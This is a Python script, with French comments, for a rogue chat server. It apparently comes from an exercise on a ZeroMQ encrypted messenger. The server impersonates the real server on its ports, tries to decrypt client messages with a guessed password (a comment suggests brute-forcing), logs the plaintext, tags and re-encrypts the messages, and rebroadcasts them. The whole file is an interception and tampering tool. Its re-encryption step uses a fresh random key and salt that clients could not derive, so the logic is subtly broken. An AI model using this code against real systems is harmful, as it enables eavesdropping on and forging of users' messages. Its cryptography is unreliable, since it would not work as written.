import zmq
import msgpack
import base64
import logging
from cryptography.fernet import Fernet
import os

class RogueServer:
    def __init__(self):
        self.context = zmq.Context()
        
        # On se connecte aux mêmes ports que le vrai serveur
        self.rep_socket = self.context.socket(zmq.REP)
        self.rep_socket.bind("tcp://*:6666")
        
        self.pub_socket = self.context.socket(zmq.PUB)
        self.pub_socket.bind("tcp://*:6667")
        
        # On génère notre propre clé pour pouvoir modifier les messages
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        
        # On garde une trace des clients connectés
        self.clients = set()
        
        self.log = logging.getLogger("RogueServer")
        logging.basicConfig(level=logging.INFO)
        
    def handle_join(self, frame):
        if frame["nick"] in self.clients:
            return {"response": "ko"}
        self.clients.add(frame["nick"])
        return {"response": "ok"}
    
    def handle_leave(self, frame):
        if frame["nick"] not in self.clients:
            return {"response": "ko"}
        self.clients.remove(frame["nick"])
        return {"response": "ok"}
    
    def handle_message(self, frame):
        # On intercepte et modifie les messages
        try:
            # On récupère le message chiffré et le sel
            encrypted_msg = base64.b64decode(frame["message"])
            salt = base64.b64decode(frame["salt"])
            
            # On génère une fausse clé avec un mot de passe arbitraire
            # (Dans un vrai scénario, on pourrait essayer de bruteforcer)
            fake_password = "rogue_password"
            fake_key = self.derive_key(fake_password, salt)
            
            try:
                # Essayons de déchiffrer avec notre fausse clé
                fernet = Fernet(fake_key)
                decrypted = fernet.decrypt(encrypted_msg).decode()
                self.log.info(f"Original message: {decrypted}")
                
                # Modifions le message
                modified_msg = f"[MODIFIED BY ROGUE] {decrypted}"
                
                # Rechiffrons avec notre propre clé
                new_encrypted = self.fernet.encrypt(modified_msg.encode())
                frame["message"] = base64.b64encode(new_encrypted).decode()
                frame["salt"] = base64.b64encode(os.urandom(16)).decode()
                
            except:
                # Si le déchiffrement échoue, on passe quand même le message
                self.log.warning("Failed to decrypt message, passing it through")
            
            return {"response": "ok"}
        
        except Exception as e:
            self.log.error(f"Error handling message: {e}")
            return {"response": "ko"}
    
    def derive_key(self, password: str, salt: bytes) -> bytes:
        # Implémentation simplifiée de la dérivation de clé
        # (identique à celle du client pour être compatible)
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
        from cryptography.hazmat.primitives import hashes
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000
        )
        return base64.urlsafe_b64encode(kdf.derive(password.encode()))
    
    def run(self):
        self.log.info("Rogue server running...")
        while True:
            try:
                # Réception des messages
                message = self.rep_socket.recv()
                frame = msgpack.unpackb(message)
                
                # Traitement selon le type de message
                if frame["type"] == "join":
                    response = self.handle_join(frame)
                elif frame["type"] == "leave":
                    response = self.handle_leave(frame)
                elif frame["type"] == "message":
                    response = self.handle_message(frame)
                    # On transmet le message modifié à tous les clients
                    self.pub_socket.send(msgpack.packb(frame))
                elif frame["type"] == "list":
                    response = {"response": list(self.clients)}
                else:
                    response = {"response": "ko"}
                
                # Réponse au client
                self.rep_socket.send(msgpack.packb(response))
                
            except Exception as e:
                self.log.error(f"Error: {e}")
                self.rep_socket.send(msgpack.packb({"response": "ko"}))

if __name__ == "__main__":
    server = RogueServer()
    server.run()